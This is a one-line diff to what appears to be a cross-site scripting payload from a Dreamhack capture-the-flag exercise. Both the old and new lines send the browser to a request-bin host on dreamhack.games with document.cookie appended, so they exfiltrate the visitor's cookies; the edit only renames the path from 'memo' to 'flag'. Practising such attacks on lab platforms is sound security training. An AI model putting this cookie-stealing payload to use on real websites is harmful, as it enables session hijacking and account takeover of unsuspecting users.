@@ -1,1 +1,1 @@
-location.href="https://kdeymur.request.dreamhack.games/memo?memo="+document.cookie
+location.href="https://kdeymur.request.dreamhack.games/flag?flag="+document.cookie
